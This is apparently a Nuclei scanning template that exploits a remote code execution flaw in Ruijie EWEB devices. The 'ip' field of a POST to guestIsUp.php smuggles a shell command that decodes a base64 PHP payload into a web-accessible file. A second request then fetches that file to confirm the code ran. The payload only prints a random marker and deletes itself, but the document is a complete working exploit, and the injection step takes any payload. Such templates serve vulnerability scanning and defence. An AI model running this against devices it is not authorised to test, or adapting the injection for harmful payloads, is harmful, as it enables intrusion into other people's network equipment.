id: ruijie-eweb-rce
info:
  name: Ruijie EWEB RCE Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Exploitation of a remote code execution vulnerability in Ruijie EWEB by uploading a PHP payload.

variables:
  r1: "{{rand_text_lower(8)}}"
  r2: "{{rand_text_lower(8)}}"
  phpcode: "<?php echo '{{r1}}'; unlink(__FILE__); ?>"
  payload: "{{base64(phpcode)}}"

http:
  - id: upload-payload
    method: POST
    path:
      - "{{BaseURL}}/guest_auth/guestIsUp.php"
    headers:
      Accept-Encoding: gzip, deflate
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: |
      ip=127.0.0.1|echo '{{payload}}' | base64 -d > {{r2}}.php&mac=00-00
    matchers:
      - type: status
        status:
          - 200

  - id: verify-payload
    method: GET
    path:
      - "{{BaseURL}}/guest_auth/{{r2}}.php"
    headers:
      Accept-Encoding: gzip, deflate
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{r1}}"
